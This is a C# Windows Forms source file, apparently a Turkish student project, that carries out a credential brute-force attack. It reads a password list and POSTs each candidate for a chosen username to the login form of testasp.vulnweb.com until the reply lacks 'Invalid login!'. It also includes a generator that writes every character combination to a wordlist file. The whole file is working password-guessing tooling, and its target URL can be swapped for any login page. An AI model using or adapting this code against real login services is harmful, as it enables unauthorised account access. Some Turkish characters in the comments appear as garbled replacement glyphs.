namespace brute_force_attack_eliforencik
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private async void btnStartAttack_ClickAsync(object sender, EventArgs e)
        {
            string username = txtUsername.Text;
            string passwordFilePath = txtPasswordList.Text.Trim();
            string url = "http://testasp.vulnweb.com/Login.asp?RetURL=%2FDefault%2Easp%3F";
            await Attack(url, username, passwordFilePath);
        }


        private async Task Attack(string url, string username, string passwordFilePath)
        {
            try
            {
                using (HttpClient client = new HttpClient())
                {
                    // �ifre listesini oku
                    var passwords = File.ReadAllLines(passwordFilePath);

                    foreach (var password in passwords)
                    {
                        // Form verisini POST veri olarak haz�rla
                        var postData = new FormUrlEncodedContent(new[]
                        {
                            new KeyValuePair<string, string>("tfUName", username),
                            new KeyValuePair<string, string>("tfUPass", password),
                            new KeyValuePair<string, string>("submit", "Login") // Bu de�erler siteye g�re de�i�ebilir
                        });

                        // HTTP POST iste�ini g�nder
                        HttpResponseMessage response = await client.PostAsync(url, postData);

                        // HTTP yan�t�n� kontrol et
                        if (response.IsSuccessStatusCode)
                        {
                            // E�er yan�t ba�ar�l�ysa, yani 200-299 aras� kodlarsa, i�erik kontrol� yap
                            string responseBody = await response.Content.ReadAsStringAsync();

                            if (responseBody.Contains("Invalid login!"))
                            {
                                // Hatal� �ifre
                                richTextBoxLogs.AppendText($"Ba�ar�s�z giri� denemesi. Kullan�lan �ifre: {password}\n");
                            }
                            else
                            {
                                // Ba�ar�l� giri�
                                richTextBoxLogs.AppendText($"Ba�ar�l�! Do�ru �ifre: {password}\n");
                                // Pop-up mesaj bildirisi g�ster
                                MessageBox.Show($"Do�ru �ifre bulundu: {password}", "Ba�ar�l� Giri�", MessageBoxButtons.OK, MessageBoxIcon.Information);
                                break; // Ba�ar� sa�land���nda i�lemi durdur
                            }
                        }
                        else
                        {
                            // Yan�t ba�ar�l� de�ilse, yan�t kodunu yazd�r
                            richTextBoxLogs.AppendText($"Hata! Yan�t kodu: {response.StatusCode}\n");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Bir hata olu�tu: " + ex.Message);
            }
        }

        private void btnSelectPasswordList_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Filter = "Metin Dosyalar� (*.txt)|*.txt";
            openFileDialog.Title = "�ifre Listesi Se�in";

            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                txtPasswordList.Text = openFileDialog.FileName;
            }
        }

        private void btnOlustur_Click(object sender, EventArgs e)
        {
            int minLen = Int16.Parse(minkrktr_txt.Text);
            int maxLen = Int16.Parse(maxkrktr_txt.Text);
            string charset = set_txt.Text;
            CreateWordlist(minLen, maxLen, charset);
        }
        public void CreateWordlist(int minLen, int maxLen, string charset)
        {
            try
            {
                if (string.IsNullOrWhiteSpace(charset))
                {
                    MessageBox.Show("Karakter seti bo� olamaz!", "Hata", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                // Proje dizinine kaydet
                string outputPath = Path.Combine(Application.StartupPath, "wordlist.txt");

                using (StreamWriter writer = new StreamWriter(outputPath))
                {
                    for (int length = minLen; length <= maxLen; length++)
                    {
                        GenerateCombinations(charset, "", length, writer);
                    }
                }

                if (File.Exists(outputPath))
                {
                    MessageBox.Show($"Kelime listesi ba�ar�yla kaydedildi!\nDosya Yolu: {outputPath}", "Ba�ar�l�", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Bir hata olu�tu: {ex.Message}", "Hata", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        private void GenerateCombinations(string charset, string prefix, int length, StreamWriter writer)
        {
            if (length == 0)
            {
                writer.WriteLine(prefix);
                return;
            }

            foreach (char c in charset)
            {
                GenerateCombinations(charset, prefix + c, length - 1, writer);
            }
        }
    }
}
